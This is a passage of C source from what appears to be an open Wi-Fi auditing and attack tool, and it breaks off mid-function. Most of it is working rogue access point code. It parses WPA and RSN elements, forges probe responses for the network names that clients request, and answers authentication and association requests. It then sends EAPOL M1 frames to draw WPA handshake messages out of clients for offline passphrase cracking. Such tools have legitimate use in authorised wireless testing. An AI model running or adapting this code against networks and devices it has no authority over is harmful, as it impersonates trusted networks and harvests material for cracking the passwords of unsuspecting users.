	if(gsuiteptr->type == CS_WEP104) bssidinfo->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) bssidinfo->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) bssidinfo->groupcipher |= TCS_NOT_ALLOWED;
	}
wpalen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < csuitecountptr->count; c++)
	{
	csuiteptr = (suite_t*)ieptr;
	if(memcmp(csuiteptr->oui, &ouimscorp, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) bssidinfo->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) bssidinfo->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) bssidinfo->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) bssidinfo->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) bssidinfo->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) bssidinfo->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) bssidinfo->cipher |= TCS_NOT_ALLOWED;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < asuitecountptr->count; c++)
	{
	asuiteptr = (suite_t*)ieptr;
	if(memcmp(asuiteptr->oui, &ouimscorp, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) bssidinfo->wpaakm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) bssidinfo->wpaakm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) bssidinfo->wpaakm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) bssidinfo->wpaakm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) bssidinfo->wpaakm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) bssidinfo->wpaakm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) bssidinfo->wpaakm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) bssidinfo->wpaakm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) bssidinfo->wpaakm |= TAK_FT_SAE;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
return;
}
/*===========================================================================*/
static inline void gettagrsn(bssidinfo_t *bssidinfo, int rsnlen, uint8_t *ieptr)
{
static int c;
static rsnie_t *rsnptr;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;
static rsncapabilites_t *rsncapptr;

rsnptr = (rsnie_t*)ieptr;
if(rsnptr->version != 1) return;
bssidinfo->kdv |= BSSID_KDV_RSN;
rsnlen -= RSNIE_SIZE;
ieptr += RSNIE_SIZE;
gsuiteptr = (suite_t*)ieptr;
if(memcmp(gsuiteptr->oui, &suiteoui, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) bssidinfo->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) bssidinfo->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) bssidinfo->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) bssidinfo->groupcipher |= TCS_CCMP;
	if(gsuiteptr->type == CS_WEP104) bssidinfo->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) bssidinfo->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) bssidinfo->groupcipher |= TCS_NOT_ALLOWED;
	}
rsnlen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < csuitecountptr->count; c++)
	{
	csuiteptr = (suite_t*)ieptr;
	if(memcmp(csuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) bssidinfo->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) bssidinfo->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) bssidinfo->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) bssidinfo->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) bssidinfo->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) bssidinfo->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) bssidinfo->cipher |= TCS_NOT_ALLOWED;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < asuitecountptr->count; c++)
	{
	asuiteptr = (suite_t*)ieptr;
	if(memcmp(asuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) bssidinfo->rsnakm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) bssidinfo->rsnakm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) bssidinfo->rsnakm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) bssidinfo->rsnakm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) bssidinfo->rsnakm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) bssidinfo->rsnakm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) bssidinfo->rsnakm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) bssidinfo->rsnakm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) bssidinfo->rsnakm |= TAK_FT_SAE;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
rsncapptr = (rsncapabilites_t*)ieptr;
bssidinfo->rsncapa = rsncapptr->rsncapa;
return;
}
/*===========================================================================*/
static inline void gettagvendor(bssidinfo_t *bssidinfo, int vendorlen, uint8_t *ieptr)
{
static wpaie_t *wpaptr;

wpaptr = (wpaie_t*)ieptr;
if(memcmp(wpaptr->oui, &ouimscorp, 3) != 0) return;
if((wpaptr->ouitype == VT_WPA_IE) && (vendorlen >= WPAIE_LEN_MIN)) gettagwpa(bssidinfo, vendorlen, ieptr);
return;
}
/*===========================================================================*/
static inline uint8_t get_tag_channel(int infolen, uint8_t *infoptr)
{
static ietag_t *tagptr;

while(0 < infolen)
	{
	if(infolen == 4) return 0;
	tagptr = (ietag_t*)infoptr;
	if(tagptr->len > infolen) return 0;
	if(tagptr->id == TAG_CHAN)
		{
		if(tagptr->len == 1) return tagptr->data[0];
		return 0;
		}
	infoptr += tagptr->len +IETAG_SIZE;
	infolen -= tagptr->len +IETAG_SIZE;
	}
return 0;
}
/*===========================================================================*/
static inline void get_tag_essid(essid_t *essidinfo, int infolen, uint8_t *infoptr)
{
static ietag_t *tagptr;

essidinfo->essidlen = 0;
essidinfo->essid[0] = 0;
while(0 < infolen)
	{
	if(infolen == 4) return;
	tagptr = (ietag_t*)infoptr;
	if(tagptr->len > infolen) return;
	if(tagptr->id == TAG_SSID)
		{
		if(tagptr->len <= ESSID_LEN_MAX)
			{
			essidinfo->essidlen = tagptr->len;
			memcpy(essidinfo->essid, &tagptr->data[0], tagptr->len);
			}
		return;
		}
	infoptr += tagptr->len +IETAG_SIZE;
	infolen -= tagptr->len +IETAG_SIZE;
	}
return;
}
/*===========================================================================*/
static inline void get_taglist(bssidinfo_t *bssidinfo, int infolen, uint8_t *infoptr)
{
static ietag_t *tagptr;

while(0 < infolen)
	{
	if(infolen == 4) return;
	tagptr = (ietag_t*)infoptr;
	if(tagptr->len > infolen) return;
	if(tagptr->id == TAG_SSID)
		{
		if((tagptr->len > 0) && (tagptr->len <= ESSID_LEN_MAX))
			{
			if(tagptr->data[0] > 0)
				{
				bssidinfo->essidlen = tagptr->len;
				memcpy(bssidinfo->essid, &tagptr->data[0], tagptr->len);
				}
			}
		}
	else if(tagptr->id == TAG_CHAN)
		{
		if(tagptr->len == 1) bssidinfo->channel = tagptr->data[0];
		}
	else if(tagptr->id == TAG_RSN)
		{
		if(tagptr->len >= RSNIE_LEN_MIN) gettagrsn(bssidinfo, tagptr->len, tagptr->data);
		}
	else if(tagptr->id == TAG_VENDOR)
		{
		if(tagptr->len >= VENDORIE_SIZE) gettagvendor(bssidinfo, tagptr->len, tagptr->data);
		}
	infoptr += tagptr->len +IETAG_SIZE;
	infolen -= tagptr->len +IETAG_SIZE;
	}
return;
}
/*===========================================================================*/
static inline void process80211reassociation_req()
{
static int p;
static uint16_t clientinfolen;
static capreqsta_t *capreqsta;
#ifdef GETM2
static uint8_t *clientinfoptr;
static bssidinfo_t bssidinfo;
#endif

tfctimestamp = timestamp;
if(macfrx->retry == 1) return;
writeepb(fd_pcapng);
clientinfolen = payloadlen -CAPABILITIESREQSTA_SIZE;
if(clientinfolen < IETAG_SIZE) return;
if(memcmp(&mac_broadcast, macfrx->addr2, 6) == 0) return;
capreqsta = (capreqsta_t *)payloadptr;
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if(memcmp(capreqsta->addr, (bssidlist +p)->mac, 6) != 0) continue;
	memcpy((bssidlist +p)->bssidinfo->macclient, macfrx->addr2, 6);
	break;
	}
#ifdef GETM2
clientinfoptr = payloadptr +CAPABILITIESREQSTA_SIZE;
for(p = 0; p < CLIENTLIST_MAX; p++)
	{
	if((clientlist +p)->timestamp == 0) break;
	if((clientlist +p)->count >= m2attempts) return;
	if((memcmp((clientlist +p)->mac, macfrx->addr2, 6) != 0) || (memcmp((clientlist +p)->macap, macfrx->addr1, 6) != 0)) continue;
	memset(&bssidinfo, 0 , sizeof(bssidinfo));
	get_taglist(&bssidinfo, clientinfolen, clientinfoptr);
	(clientlist +p)->essid |= CLIENT_ESSID;
	if((bssidinfo.kdv &BSSID_KDV_RSN) == BSSID_KDV_RSN)
		{
		if((bssidinfo.rsnakm &TAK_PSK) == TAK_PSK)
			{
			if(ptrscanlist->frequency < 3000) send_reassociation_resp();
			else send_reassociation_resp_5();
			send_m1_wpa2(macfrx->addr2, macfrx->addr1);
			memcpy(&mac_pending, macfrx->addr1, 6);
			}
		if((bssidinfo.rsnakm &TAK_PSKSHA256) == TAK_PSKSHA256)
			{
			if(ptrscanlist->frequency < 3000) send_reassociation_resp();
			else send_reassociation_resp_5();
			send_m1_wpa2kv3(macfrx->addr2, macfrx->addr1);
			memcpy(&mac_pending, macfrx->addr1, 6);
			}
		return;
		}
	if(((bssidinfo.kdv &BSSID_KDV_WPA) == BSSID_KDV_WPA) && ((bssidinfo.wpaakm &TAK_PSK) == TAK_PSK))
		{
		if(ptrscanlist->frequency < 3000) send_reassociation_resp();
		else send_reassociation_resp_5();
		send_m1_wpa1(macfrx->addr2, macfrx->addr1);
		memcpy(&mac_pending, macfrx->addr1, 6);
		}
	return;
	}
memset((clientlist +p), 0, CLIENTLIST_SIZE);
(clientlist +p)->timestamp = timestamp;
memcpy((clientlist +p)->mac, macfrx->addr2, 6);
memcpy((clientlist +p)->macap, macfrx->addr1, 6);
memset(&bssidinfo, 0 , sizeof(bssidinfo));
get_taglist(&bssidinfo, clientinfolen, clientinfoptr);
(clientlist +p)->essid |= CLIENT_ESSID;
if((bssidinfo.kdv &BSSID_KDV_RSN) == BSSID_KDV_RSN)
	{
	if((bssidinfo.rsnakm &TAK_PSK) == TAK_PSK)
		{
		if(ptrscanlist->frequency < 3000) send_reassociation_resp();
		else send_reassociation_resp_5();
		send_m1_wpa2(macfrx->addr2, macfrx->addr1);
		memcpy(&mac_pending, macfrx->addr1, 6);
		}
	if((bssidinfo.rsnakm &TAK_PSKSHA256) == TAK_PSKSHA256)
		{
		if(ptrscanlist->frequency < 3000) send_reassociation_resp();
		else send_reassociation_resp_5();
		send_m1_wpa2kv3(macfrx->addr2, macfrx->addr1);
		memcpy(&mac_pending, macfrx->addr1, 6);
		}
	return;
	}
if(((bssidinfo.kdv &BSSID_KDV_WPA) == BSSID_KDV_WPA) && ((bssidinfo.wpaakm &TAK_PSK) == TAK_PSK))
	{
	if(ptrscanlist->frequency < 3000) send_reassociation_resp();
	else send_reassociation_resp_5();
	send_m1_wpa1(macfrx->addr2, macfrx->addr1);
	memcpy(&mac_pending, macfrx->addr1, 6);
	}
#endif
return;
}


/*===========================================================================*/
static inline void confirmassociation_req()
{
static int p;

for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) != 0) continue;
	(bssidlist +p)->bssidinfo->status |= BSSID_ESSID;
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211association_req()
{
#ifdef GETM2
static int p;
static uint8_t *clientinfoptr;
static uint16_t clientinfolen;
static bssidinfo_t bssidinfo;
#endif

tfctimestamp = timestamp;
if(macfrx->retry == 1) return;
writeepb(fd_pcapng);
#ifdef GETM2
clientinfoptr = payloadptr +CAPABILITIESSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESSTA_SIZE;
if(clientinfolen < IETAG_SIZE) return;
for(p = 0; p < CLIENTLIST_MAX; p++)
	{
	if((clientlist +p)->timestamp == 0) break;
	if((clientlist +p)->count >= m2attempts) return;
	if((memcmp((clientlist +p)->mac, macfrx->addr2, 6) != 0) || (memcmp((clientlist +p)->macap, macfrx->addr1, 6) != 0)) continue;
	(clientlist +p)->essid |= CLIENT_ESSID;
	memset(&bssidinfo, 0 , sizeof(bssidinfo));
	get_taglist(&bssidinfo, clientinfolen, clientinfoptr);
	if((bssidinfo.kdv &BSSID_KDV_RSN) == BSSID_KDV_RSN)
		{
		if((bssidinfo.rsnakm &TAK_PSK) == TAK_PSK)
			{
			if(ptrscanlist->frequency < 3000) send_association_resp();
			else send_association_resp_5();
			send_m1_wpa2(macfrx->addr2, macfrx->addr1);
			memcpy(&mac_pending, macfrx->addr1, 6);
			return;
			}
		if((bssidinfo.rsnakm &TAK_PSKSHA256) == TAK_PSKSHA256)
			{
			if(ptrscanlist->frequency < 3000) send_association_resp();
			else send_association_resp_5();
			send_m1_wpa2kv3(macfrx->addr2, macfrx->addr1);
			memcpy(&mac_pending, macfrx->addr1, 6);
			return;
			}
		return;
		}
	if(((bssidinfo.kdv &BSSID_KDV_WPA) == BSSID_KDV_WPA) && ((bssidinfo.wpaakm &TAK_PSK) == TAK_PSK))
		{
		if(ptrscanlist->frequency < 3000) send_association_resp();
		else send_association_resp_5();
		send_m1_wpa2(macfrx->addr2, macfrx->addr1);
		memcpy(&mac_pending, macfrx->addr1, 6);
		return;
		}
	return;
	}
memset((clientlist +p), 0, CLIENTLIST_SIZE);
(clientlist +p)->timestamp = timestamp;
memcpy((clientlist +p)->mac, macfrx->addr2, 6);
memcpy((clientlist +p)->macap, macfrx->addr1, 6);
memset(&bssidinfo, 0 , sizeof(bssidinfo));
get_taglist(&bssidinfo, clientinfolen, clientinfoptr);
(clientlist +p)->essid |= CLIENT_ESSID;
if((bssidinfo.kdv &BSSID_KDV_RSN) == BSSID_KDV_RSN)
	{
	if((bssidinfo.rsnakm &TAK_PSK) == TAK_PSK)
		{
		if(ptrscanlist->frequency < 3000) send_association_resp();
		else send_association_resp_5();
		send_m1_wpa2(macfrx->addr2, macfrx->addr1);
		memcpy(&mac_pending, macfrx->addr1, 6);
		return;
		}
	if((bssidinfo.rsnakm &TAK_PSKSHA256) == TAK_PSKSHA256)
		{
		if(ptrscanlist->frequency < 3000) send_association_resp();
		else send_association_resp_5();
		send_m1_wpa2kv3(macfrx->addr2, macfrx->addr1);
		memcpy(&mac_pending, macfrx->addr1, 6);
		return;
		}
	return;
	}
if(((bssidinfo.kdv &BSSID_KDV_WPA) == BSSID_KDV_WPA) && ((bssidinfo.wpaakm &TAK_PSK) == TAK_PSK))
	{
	if(ptrscanlist->frequency < 3000) send_association_resp();
	else send_association_resp_5();
	send_m1_wpa2(macfrx->addr2, macfrx->addr1);
	memcpy(&mac_pending, macfrx->addr1, 6);
	return;
	}
#endif
return;
}
/*===========================================================================*/
static inline void process80211association_resp()
{
tfctimestamp = timestamp;
if(macfrx->retry == 1) return;
if(memcmp(&macrgclient, macfrx->addr1, 6) == 0) send_null();
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void send_authentication_resp_opensystem()
{
static mac_t *macftx;
static const uint8_t authenticationresponsedata[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define AUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr3, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationresponsedata, AUTHENTICATIONRESPONSE_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +AUTHENTICATIONRESPONSE_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void process80211authentication_opensystem()
{
#ifdef GETM2
static int p;
#endif

if(macfrx->retry == 1) return;
#ifdef GETM2
for(p = 0; p < CLIENTLIST_MAX; p++)
	{
	if((clientlist +p)->timestamp == 0) break;
	if((memcmp((clientlist +p)->mac, macfrx->addr2, 6) != 0) || (memcmp((clientlist +p)->macap, macfrx->addr1, 6) != 0)) continue;
	if((clientlist +p)->count >= m2attempts) return;
	send_authentication_resp_opensystem();
	if(p > 10) qsort(clientlist, p +1, CLIENTLIST_SIZE, sort_clientlist_by_time);
	return;
	}
memset((clientlist +p), 0, CLIENTLIST_SIZE);
(clientlist +p)->timestamp = timestamp;
memcpy((clientlist +p)->mac, macfrx->addr2, 6);
memcpy((clientlist +p)->macap, macfrx->addr1, 6);
send_authentication_resp_opensystem();
qsort(clientlist, p +1, CLIENTLIST_SIZE, sort_clientlist_by_time);
#endif
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211authentication()
{
static authf_t *authptr;

tfctimestamp = timestamp;
authptr = (authf_t*)payloadptr;
if(payloadlen < AUTHENTICATIONFRAME_SIZE) return;
if(authptr->sequence == 2) return;
if(authptr->algorithm == OPEN_SYSTEM) process80211authentication_opensystem();
}
/*===========================================================================*/
static inline void process80211authentication_resp_rg()
{
static int p;

tfctimestamp = timestamp;
if(macfrx->retry == 1) return;
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) return;
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		if(ptrscanlist->frequency < 3000) send_association_req_wpa2(p);
		else  send_association_req_wpa2_5(p);
		memset(&mac_pending, 0, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void send_probe_resp(uint8_t *macrgap, uint8_t essidlen, uint8_t *essid)
{
static mac_t *macftx;
static capap_t *capap;
const uint8_t proberesponse_data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: RSN Information CCM CCM PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02
};
#define PROBERESPONSE_DATA_SIZE sizeof(proberesponse_data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +essidlen +IETAG_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macrgap, 6);
memcpy(macftx->addr3, macrgap, 6);
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0xc8;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], essid, essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen], &proberesponse_data, PROBERESPONSE_DATA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen +0x0c] = ptrscanlist->channel;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen +PROBERESPONSE_DATA_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_probe_resp_5(uint8_t *macrgap, uint8_t essidlen, uint8_t *essid)
{
static mac_t *macftx;
static capap_t *capap;
const uint8_t proberesponse_data[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: RSN Information CCM CCM PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02
};
#define PROBERESPONSE_DATA_SIZE sizeof(proberesponse_data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +essidlen +IETAG_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macrgap, 6);
memcpy(macftx->addr3, macrgap, 6);
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0xc8;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], essid, essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen], &proberesponse_data, PROBERESPONSE_DATA_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essidlen +PROBERESPONSE_DATA_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void process80211proberequest()
{
static int p;
static essid_t essidinfo;

if(payloadlen < IETAG_SIZE) return;
get_tag_essid(&essidinfo, payloadlen, payloadptr);
if((essidinfo.essidlen == 0) || (essidinfo.essid[0] == 0))
	{
	#ifdef GETM2
	if(memcmp(&mac_broadcast, macfrx->addr3, 6) == 0)
		{
		#ifdef GETM2PR
		for(p = 0; p < RGBSSIDLISTTX_MAX; p++)
			{
			if(rgbssidlistprp > RGBSSIDLIST_MAX) rgbssidlistprp = 0;
			if((rgbssidlist +rgbssidlistprp)->timestamp == 0) rgbssidlistprp = 0;
			if(ptrscanlist->frequency < 3000) send_probe_resp((rgbssidlist +rgbssidlistprp)->mac, (rgbssidlist +rgbssidlistprp)->essidlen, (rgbssidlist +rgbssidlistprp)->essid);
			else send_probe_resp_5((rgbssidlist +rgbssidlistprp)->mac, (rgbssidlist +rgbssidlistprp)->essidlen, (rgbssidlist +rgbssidlistprp)->essid);
			rgbssidlistprp++;
			}
		#else
		if(rgbssidlistprp > RGBSSIDLIST_MAX) rgbssidlistprp = 0;
		if((rgbssidlist +rgbssidlistprp)->timestamp == 0) rgbssidlistprp = 0;
		if(ptrscanlist->frequency < 3000) send_probe_resp((rgbssidlist +rgbssidlistprp)->mac, (rgbssidlist +rgbssidlistprp)->essidlen, (rgbssidlist +rgbssidlistprp)->essid);
		else send_probe_resp_5((rgbssidlist +rgbssidlistprp)->mac, (rgbssidlist +rgbssidlistprp)->essidlen, (rgbssidlist +rgbssidlistprp)->essid);
		rgbssidlistprp++;
		#endif
		return;
		}
	if(ptrscanlist->frequency < 3000) send_probe_resp(macfrx->addr3, essidinfo.essidlen, essidinfo.essid);
	else send_probe_resp_5(macfrx->addr3, essidinfo.essidlen, essidinfo.essid);
	#endif
	return;
	}
for(p = 0; p < RGBSSIDLIST_MAX; p++)
	{
	if((rgbssidlist +p)->timestamp == 0) break;
	if((rgbssidlist +p)->essidlen != essidinfo.essidlen) continue;
	if(memcmp((rgbssidlist +p)->essid, essidinfo.essid, essidinfo.essidlen) != 0) continue;
	#ifdef GETM2
	if(memcmp(&mac_broadcast, macfrx->addr3, 6) == 0)
		{
		if(ptrscanlist->frequency < 3000) send_probe_resp((rgbssidlist +p)->mac, (rgbssidlist +p)->essidlen, (rgbssidlist +p)->essid);
		else send_probe_resp_5((rgbssidlist +p)->mac, (rgbssidlist +p)->essidlen, (rgbssidlist +p)->essid);
		}

	else
		{
		if(ptrscanlist->frequency < 3000) send_probe_resp(macfrx->addr3, (rgbssidlist +p)->essidlen, (rgbssidlist +p)->essid);
		else send_probe_resp_5(macfrx->addr3, (rgbssidlist +p)->essidlen, (rgbssidlist +p)->essid);
		}
	#endif
	return;
	}
memset((rgbssidlist +p), 0, RGBSSIDLIST_SIZE);
(rgbssidlist +p)->timestamp = timestamp;
(rgbssidlist +p)->sequence += 1;
(rgbssidlist +p)->essidlen = essidinfo.essidlen;
memcpy((rgbssidlist +p)->essid, essidinfo.essid, essidinfo.essidlen);
(rgbssidlist +p)->mac[5] = nicrgap & 0xff;
(rgbssidlist +p)->mac[4] = (nicrgap >> 8) & 0xff;
(rgbssidlist +p)->mac[3] = (nicrgap >> 16) & 0xff;
(rgbssidlist +p)->mac[2] = ouirgap & 0xff;
(rgbssidlist +p)->mac[1] = (ouirgap >> 8) & 0xff;
(rgbssidlist +p)->mac[0] = (ouirgap >> 16) & 0xff;
nicrgap += 1;
tfctimestamp = timestamp;
#ifdef GETM2
if(memcmp(&mac_broadcast, macfrx->addr3, 6) == 0)
	{
	if(ptrscanlist->frequency < 3000) send_probe_resp((rgbssidlist +p)->mac, (rgbssidlist +p)->essidlen, (rgbssidlist +p)->essid);
	else send_probe_resp_5((rgbssidlist +p)->mac, (rgbssidlist +p)->essidlen, (rgbssidlist +p)->essid);
	}
else
	{
	if(ptrscanlist->frequency < 3000) send_probe_resp(macfrx->addr3, (rgbssidlist +p)->essidlen, (rgbssidlist +p)->essid);
	else send_probe_resp_5(macfrx->addr3, (rgbssidlist +p)->essidlen, (rgbssidlist +p)->essid);
	}
#endif
qsort(rgbssidlist, p +1, RGBSSIDLIST_SIZE, sort_rgbssidlist_by_time);
qsort(clientlist, CLIENTLIST_MAX, CLIENTLIST_SIZE, sort_clientlist_by_time);
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211proberesponse()
{
static int p;
